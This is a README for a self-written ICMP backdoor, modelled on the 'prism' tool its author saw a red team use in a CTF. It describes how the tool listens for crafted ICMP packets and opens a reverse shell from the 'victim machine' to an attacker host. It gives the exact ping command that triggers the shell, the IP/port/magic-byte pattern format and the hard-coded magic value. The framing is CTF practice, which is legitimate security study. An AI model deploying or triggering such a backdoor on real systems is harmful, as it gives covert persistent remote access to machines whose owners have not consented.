# icmp-backdoor

During the BSidesLV Pros vs. Joes CTF, it was revealed that the red
cell used a very similar tool to this known as prism to achieve
persistence in a few of our machines. I decided to write my own tool
similar to this for practice.

Prism: https://github.com/andreafabrizi/prism

The concept behind this tool is that it listens for specially crafted
ICMP packets, and if they match a certain criteria, it will spawn a
reverse shell to a specified host and port.

# Usage

Prism uses its own tool to send the packets. I opted for a "live off
the land" approach and use the commonly-available _ping_ utility with
the -p flag:

	$ ping -c 1 -p 0a0a001710002a7a host

The format for the pattern is: IIIIIIIIPPPPMMMM where I is IP address,
P is port, and M is magic bytes. This is represented as hexadecimal,
so you will either have to be a weirdo like me and be able to
calculate this in your head or use a calculator. I will add a shell
script to leverage this in the next few days.

In the above example:

	IP: 0a0a0017 is 10.10.0.23
	Port: 1000 is 4096
	Magic is 2a7a, which is hard-coded into this program.

This will open a reverse shell from the victim machine to 10.10.0.23:4096.

The magic bytes are there for alignment purposes when using the -p
flag with ping and as a mechanism to determine if a shell should be
opened when an ICMP packet is received.



